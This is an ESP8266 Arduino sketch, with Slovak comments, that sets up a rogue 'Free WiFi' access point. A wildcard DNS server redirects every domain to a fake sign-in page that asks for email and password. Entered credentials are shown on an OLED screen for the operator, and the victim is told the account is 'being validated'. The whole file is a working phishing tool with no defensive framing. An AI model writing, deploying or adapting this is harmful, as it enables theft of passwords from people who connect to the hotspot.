#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h> // Knižnica na komunikáciu s I2C
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// OLED nastavenia
#define SCREEN_WIDTH 128 // Šírka OLED displeja
#define SCREEN_HEIGHT 64 // Výška OLED displeja
#define OLED_RESET -1    // Reset pin pre OLED (ak nie je potrebný, nastavíme na -1)
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// User configuration
#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

// Function prototypes
void displayCredentials(String email, String password);
String posted();

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);  // Gateway

DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Funkcia na zobrazenie prihlasovacích údajov na OLED displeji
void displayCredentials(String email, String password) {
  display.clearDisplay();
  display.setTextSize(1);      // Veľkosť textu
  display.setTextColor(SSD1306_WHITE); // Farba textu (biela)
  
  display.setCursor(0, 0);     // Nastavenie kurzora na pozíciu (0, 0)
  display.println("New Credentials:");
  display.println("Email:");
  display.println(email);      // Zobrazenie emailu
  display.println("Password:");
  display.println(password);   // Zobrazenie hesla
  
  display.display();           // Aktualizácia displeja
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; 
}

String posted() {
  String email = input("email");
  String password = input("password");

  // Zobraz email a heslo na OLED displeji
  displayCredentials(email, password);
  
  return header(POST_TITLE) + POST_BODY + "</div><div><p>Email: <b>" + email + "</b></p><p>Password: <b>" + password + "</b></p></div>";
}

void setup() {
  // Inicializácia sériového portu a OLED displeja
  Serial.begin(115200);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // I2C adresa OLED displeja je 0x3C
    Serial.println(F("OLED displej sa nepodarilo inicializovať"));
    while(true); // Ak OLED nefunguje, zastavíme program
  }
  
  display.display();      // Zobraz úvodný obsah displeja
  delay(1000);            // Počkajte 1 sekundu
  display.clearDisplay(); // Vymaž obsah displeja
  
  // Nastavenie Wi-Fi v režime Access Point (AP)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  
  // DNS server pre presmerovanie všetkých domén na lokálnu IP ESP8266
  dnsServer.start(DNS_PORT, "*", APIP);

  // Spustenie webového servera
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });
  
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='text' name='email'><br><b>Password:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
  });
  
  webServer.begin();
  Serial.println("HTTP server started...");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
